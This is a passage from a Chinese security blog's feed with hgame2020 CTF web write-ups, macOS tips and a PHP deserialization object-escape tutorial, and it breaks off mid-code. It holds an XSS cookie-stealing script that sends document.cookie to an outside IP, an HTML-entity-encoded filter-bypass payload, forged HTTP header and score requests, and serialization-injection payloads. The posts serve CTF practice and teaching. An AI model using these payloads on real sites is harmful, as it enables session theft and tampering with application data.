class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送post请求函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($url, $post_data = <span class="string">''</span>, $timeout = <span class="number">5</span>)</span></span>&#123;<span class="comment">//curl</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt ($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>($post_data != <span class="string">''</span>)&#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    $file_contents = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $file_contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换数组中的元素</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrContentReplact</span><span class="params">($array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($array))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($array <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            $array[$k] = arrContentReplact($array[$k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $array = str_replace(<span class="keyword">array</span>(<span class="string">''</span>, <span class="string">'encrypt'</span>,<span class="string">'base64_encode'</span>), <span class="keyword">array</span>(<span class="string">''</span>, <span class="string">'decrypt'</span>,<span class="string">'base64_decode'</span>), $array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取加密的token字符串</span></span><br><span class="line">$text = file_get_contents(<span class="string">'http://ffddf97958.php.hgame.n3ko.co/'</span>);</span><br><span class="line">$re = <span class="string">'/&lt;\/code&gt;&lt;br&gt;(.+)&lt;br&gt;/msx'</span>;</span><br><span class="line">preg_match_all($re, $text, $matches, PREG_SET_ORDER, <span class="number">0</span>);</span><br><span class="line">$str = $matches[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取code代码，提取其中的加密函数，加密函数会一直变</span></span><br><span class="line">$code_text = file_get_contents(<span class="string">'http://ffddf97958.php.hgame.n3ko.co/mycode'</span>);</span><br><span class="line">$re = <span class="string">'/echo\((.+)\$_SERVER.+if/msx'</span>;</span><br><span class="line">preg_match_all($re, $code_text, $matches, PREG_SET_ORDER, <span class="number">0</span>);</span><br><span class="line">$code = $matches[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">$payload = explode(<span class="string">'('</span>,$code);  <span class="comment">//把加密函数以(分割</span></span><br><span class="line">$payload = array_filter($payload);  <span class="comment">//删除数组中的空值</span></span><br><span class="line">$payload = arrContentReplact($payload);  <span class="comment">//调用替换数组中的元素</span></span><br><span class="line">$payload = array_reverse($payload);  <span class="comment">//数组中的元素逆置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//把逆置后的元素拼接起来</span></span><br><span class="line">$payload_str = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($payload <span class="keyword">as</span> $v)&#123;</span><br><span class="line">    $payload_str .=( $v.<span class="string">'('</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//逆向解出token</span></span><br><span class="line"><span class="keyword">eval</span>((<span class="string">'$token='</span>.$payload_str.<span class="string">'$str'</span>.str_repeat(<span class="string">')'</span>,<span class="number">10</span>).<span class="string">';'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送post请求</span></span><br><span class="line"><span class="keyword">echo</span> post(<span class="string">'http://ffddf97958.php.hgame.n3ko.co'</span>,<span class="string">'token='</span>.$token);</span><br></pre></td></tr></table></figure><h2 id="Cosmos的聊天室-这题是赛后复现的"><a href="#Cosmos的聊天室-这题是赛后复现的" class="headerlink" title="Cosmos的聊天室(这题是赛后复现的)"></a>Cosmos的聊天室(这题是赛后复现的)</h2><p>首先进行fuzz，这里过滤了<code>&lt;&gt;</code>中的内容、<code>script</code>、<code>iframe</code>等，并且所有字母会被大写</p><p>4.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var image=new Image();</span><br><span class="line">image.src=&quot;http://118.25.36.154:10006/cookies.phpcookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure><p>原始payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://118.25.36.154/4.js&apos;;//</span><br></pre></td></tr></table></figure><p>由于尖括号不能两个同时存在，我们可以使用<code>&lt;</code>，浏览器会自动帮我们闭合。函数我们可以使用html编码绕过。</p><p><code>//</code>的原因是要注释掉插入聊天框后的<code>&lt;span&gt;</code></p><p>bypass payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=S=&amp;#x63;&amp;#x72;&amp;#x65;&amp;#x61;&amp;#x74;&amp;#x65;&amp;#x45;&amp;#x6c;&amp;#x65;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x22;&amp;#x29;&amp;#x3b;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x64;&amp;#x43;&amp;#x68;&amp;#x69;&amp;#x6c;&amp;#x64;&amp;#x28;&amp;#x53;&amp;#x29;&amp;#x3b;&amp;#x53;&amp;#x2e;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x31;&amp;#x38;&amp;#x2e;&amp;#x32;&amp;#x35;&amp;#x2e;&amp;#x33;&amp;#x36;&amp;#x2e;&amp;#x31;&amp;#x35;&amp;#x34;&amp;#x2f;&amp;#x34;&amp;#x2e;&amp;#x6a;&amp;#x73;&amp;#x22;&amp;#x2f;&amp;#x2f;</span><br></pre></td></tr></table></figure><p>然后nc监听</p><p><img src="http://images.xianyu123.club/Cosmos_chat1.png" alt></p><p>最后替换token即可获得flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week2_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week1_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/01/25/hgame2020-Level-Week1_Web_writeup/"/>
    <id>http://0clickjacking0.github.io/2020/01/25/hgame2020-Level-Week1_Web_writeup/</id>
    <published>2020-01-25T13:47:00.000Z</published>
    <updated>2020-01-25T13:55:03.656Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week1_Web_writeup</p><a id="more"></a><h1 id="Level-Week1"><a href="#Level-Week1" class="headerlink" title="Level - Week1"></a>Level - Week1</h1><h2 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h2><p>刚开始以为是git泄漏，然后需要回滚，发现并没有，然后再次访问<code>.git/config</code>，发现了一个<code>github</code>地址</p><p><img src="http://images.xianyu123.club/cosmos1.png" alt></p><p>然后跟进访问这个<code>github</code>，查看<code>commits</code>，发现flag在这里</p><p><img src="http://images.xianyu123.club/cosmos2.png" alt></p><p>base64解码<code>aGdhbWV7ZzF0X2xlQGtfMXNfZGFuZ2VyMHVzXyEhISF9</code>，得到flag<code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></p><h2 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h2><p>从题目名字来看可能是想让我们在header头中传入信息，打开题目后，题目中说<code>You need to come from https://vidar.club/.</code></p><p>那么我们就增加上<code>Referer: https://vidar.club/</code></p><p>根据返回包的内容，可能需要location访问，那么我们增加<code>X-Forwarded-For: 127.0.0.1</code></p><p><img src="http://images.xianyu123.club/jietou1.png" alt></p><p>根据返回包的内容，需要用<code>Cosmos</code>浏览器访问，那么我们增加<code>User-Agent: Cosmos</code></p><p><img src="http://images.xianyu123.club/jietou2.png" alt></p><p>根据返回包的内容，需要在2077年才能访问，这让我想起了中科大2019的那道题目，我们增加<code>if-unmodified-since: Fri, 01 Jan 2077 00:00:00 GMT</code></p><p>具体的用法可参考<a href="https://www.cnblogs.com/memset/p/http_if_modified_since.html" target="_blank" rel="noopener">HTTP/1.1 中 If-Modified-Since 和 If-Unmodified-Since 区别简记</a></p><p><img src="http://images.xianyu123.club/jietou3.png" alt></p><p>然后就可以得到flag了</p><p><img src="http://images.xianyu123.club/jietou4.png" alt></p><h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><p>这题确实是自己太菜了，问了学弟和其他两个师傅才想到。</p><p>首先抓包，发现有一个302跳转，然后抓取<code>index.php</code>的页面，提示405错误</p><p><img src="http://images.xianyu123.club/code_world1.png" alt></p><p>这个一般都是请求方法错误，改成post，提示需要传入a参数</p><p><img src="http://images.xianyu123.club/code_world2.png" alt></p><p>然后传入参数a=<code>2%2b8</code>（这里经过师傅们的提醒才想起来），<code>+</code>在url地址中是空格，需要编码才能显示<code>+</code></p><p><img src="http://images.xianyu123.club/code_world3.png" alt></p><h2 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h2><p>关键代码在<code>game.js</code>中的<code>gameOver()</code>函数中，如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gameOver() &#123;</span><br><span class="line"><span class="keyword">let</span> po = <span class="string">"ejIy"</span>;</span><br><span class="line"><span class="keyword">let</span> rt = po + <span class="string">"LmNj"</span>;</span><br><span class="line"><span class="keyword">let</span> rou = <span class="string">"L3N1Ym"</span>;</span><br><span class="line"><span class="keyword">let</span> sche = <span class="string">"aHR0c"</span>;</span><br><span class="line"><span class="keyword">let</span> k = <span class="string">"c2Nv"</span>;</span><br><span class="line"><span class="keyword">let</span> me = sche + <span class="string">"DovL2N"</span>;</span><br><span class="line">clearInterval(<span class="keyword">this</span>.timer)</span><br><span class="line"><span class="keyword">this</span>.context.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.canvas.width, <span class="keyword">this</span>.canvas.height)</span><br><span class="line"><span class="keyword">let</span> stamp = md5(<span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>()) / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">this</span>.globalScore = <span class="keyword">this</span>.globalScore + <span class="keyword">this</span>.storageScore;</span><br><span class="line"><span class="keyword">this</span>.context.font = <span class="string">'32px Microsoft YaHei'</span></span><br><span class="line"><span class="keyword">this</span>.context.fillStyle = <span class="string">'#000'</span></span><br><span class="line"><span class="keyword">this</span>.context.fillText(<span class="string">'CXK，你球掉了！得分：'</span> + <span class="keyword">this</span>.globalScore, <span class="number">404</span>, <span class="number">226</span>)</span><br><span class="line">$(<span class="string">"#ballspeedset"</span>).removeAttr(<span class="string">"disabled"</span>);</span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">this</span>.globalScore;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> getU = me + <span class="string">"4ay5oZ"</span>;</span><br><span class="line"><span class="keyword">let</span> rl = getU + <span class="string">"2FtZS53"</span>;</span><br><span class="line"><span class="keyword">let</span> te = rou + <span class="string">"1pdA"</span>;</span><br><span class="line"><span class="keyword">let</span> ey = k + <span class="string">"cmU="</span>;</span><br><span class="line">$.post(atob(rl + rt + te), atob(ey) + <span class="string">"="</span> + s + <span class="string">"|"</span> + stamp, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">alert(data);</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">this</span>.globalScore = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在第22行，这里post传输的网址为<code>http://cxk.hgame.wz22.cc/submit</code>，参数名为<code>score=</code>，参数值为<code>分数(大于30000)</code>、<code>|</code>、<code>stamp(在第10行)</code>三部分组成，然后构造传输即可</p><p><img src="http://images.xianyu123.club/jntm1.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week1_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>解决mac下ssh自动中断问题</title>
    <link href="http://0clickjacking0.github.io/2020/01/14/%E8%A7%A3%E5%86%B3mac%E4%B8%8Bssh%E8%87%AA%E5%8A%A8%E4%B8%AD%E6%96%AD%E9%97%AE%E9%A2%98/"/>
    <id>http://0clickjacking0.github.io/2020/01/14/解决mac下ssh自动中断问题/</id>
    <published>2020-01-14T11:20:45.000Z</published>
    <updated>2020-01-14T11:24:29.452Z</updated>
    
    <content type="html"><![CDATA[<p>解决mac下ssh自动中断问题</p><a id="more"></a><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>mac下ssh连接之后，如果长时间没有操作，服务器会自动断开这个连接，也就是ssh客户端会卡住，不能输入。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在<code>~/.ssh/config</code>（如果没有<code>config</code>文件新建一个即可）中写入下面内容，保存即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerAliveInterval 30</span><br></pre></td></tr></table></figure><p>每隔30秒，mac客户端会主动向服务器发出一次请求。这样就可以解决这个问题了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;解决mac下ssh自动中断问题&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>mac下安装consolas字体</title>
    <link href="http://0clickjacking0.github.io/2020/01/14/mac%E4%B8%8B%E5%AE%89%E8%A3%85consolas%E5%AD%97%E4%BD%93/"/>
    <id>http://0clickjacking0.github.io/2020/01/14/mac下安装consolas字体/</id>
    <published>2020-01-14T10:30:31.000Z</published>
    <updated>2020-01-16T12:44:51.780Z</updated>
    
    <content type="html"><![CDATA[<p>mac下安装consolas字体</p><a id="more"></a><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><ol><li><code>mkdir consolas</code></li><li><code>cd consolas</code></li><li><code>curl -LO https://sourceforge.net/projects/mscorefonts2/files/cabs/PowerPointViewer.exe</code></li><li><code>cabextract PowerPointViewer.exe</code></li><li><code>cabextract ppviewer.cab</code></li><li><code>open CONSOLA*.TTF</code></li></ol><p>然后就可以快乐的使用<code>consolas</code>字体啦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac下安装consolas字体&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>php反序列化中的对象逃逸</title>
    <link href="http://0clickjacking0.github.io/2019/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8/"/>
    <id>http://0clickjacking0.github.io/2019/12/17/php反序列化中的对象逃逸/</id>
    <published>2019-12-17T08:15:08.000Z</published>
    <updated>2019-12-18T13:48:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>php反序列化中的对象逃逸的学习</p><a id="more"></a><h1 id="php中的几个特性"><a href="#php中的几个特性" class="headerlink" title="php中的几个特性"></a>php中的几个特性</h1><ol><li>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape1.png" alt></p><ol start="2"><li>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>}</code> 作为结尾(字符串除外)，并且是根据长度判断内容的</li><li>对于类似这种<code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:3:&quot;123&quot;;s:1:&quot;b&quot;;s:9:&quot;xianyu123&quot;;}s:1:&quot;c&quot;;s:2:&quot;yes&quot;;</code>也是能够正常反序列化的，即使<code>s:2:&quot;yes&quot;</code>的长度不匹配也不影响。说明php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块。</li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape2.png" alt></p><h1 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h1><p>序列化的字符串在经过过滤函数不正确的处理而导致对象注入，因为先进行了序列化，再进行过滤，那么就有可能会产生此漏洞。</p><h1 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h1><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">'bb'</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">'user'</span>];</span><br><span class="line">$password = <span class="string">"mypass"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的<code>user</code>参数可控，我们先给出payload：<code>xianyu123cccccccccccccccccccc&quot;;i:1;s:6:&quot;123456&quot;;}</code></p><p>代码第4行，是把<code>c</code>替换成两个<code>b</code>，这样的话每有一个<code>c</code>，就可以多出1个字符，然后我们的核心代码是<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code>，长度为20，然后我们只需要构造20个<code>c</code>即可。</p><p><img src="http://images.xianyu123.club/php_serialize_escape4.png" alt></p><p>这样的话就可以覆盖掉本来的<code>$password = &quot;mypass&quot;;</code>，替换成了我们自己想要的密码。</p><p><img src="http://images.xianyu123.club/php_serialize_escape3.png" alt></p><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>这里模拟一个环境，就是如何覆盖掉<code>$account[&#39;g&#39;]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$account = [];</span><br><span class="line">$account[<span class="string">'u'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">$account[<span class="string">'p'</span>] = <span class="string">'pass'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line">$account[<span class="string">'g'</span>] = <span class="string">'g7bk'</span>;</span><br><span class="line">var_dump(serialize($account));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($account));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure><p>先给出payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?account[u]=cccccccccccccccccccccccccccccccccccccccc&amp;account[p]=";s:1:"m";s:9:"xianyu123";s:1:"h";s:4:"hhhh";s:1:"g";s:4:"kkkk";&#125;</span><br></pre></td></tr></table></figure><p>首先我们先不要看过滤的代码</p><p>正常情况下的序列化结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">"cccccccccccccccccccccccccccccccccccccccc"</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>经过过滤函数后的序列化结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到<code>u</code>的长度虽然为40，但是已经没有了内容，所以反序列化会自动往后读取40位</p><p><img src="http://images.xianyu123.club/php_serialize_escape6.png" alt></p><p>会读取到上图的位置，然后结束。因为<code>u</code>的序列化内容读取数据时需要往后填充40位，导致后面的<code>p</code>的内容也发生了改变，吞掉了其双引号，所以此时后面的<code>&quot;;s:1:&quot;g&quot;;s:4:&quot;g7bk&quot;;}</code>在反序列化时就会被当作非法字符忽略掉，导致我们可以控制<code>$account[&#39;g&#39;]</code>的值。</p><p><img src="http://images.xianyu123.club/php_serialize_escape5.png" alt></p><h1 id="实际中的案例分析"><a href="#实际中的案例分析" class="headerlink" title="实际中的案例分析"></a>实际中的案例分析</h1><p>joomla3.0.0-3.4.6 对象注入导致的反序列化</p><h1 id="CTF中的利用"><a href="#CTF中的利用" class="headerlink" title="CTF中的利用"></a>CTF中的利用</h1><p>安洵杯2019-easy_serialize_php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span 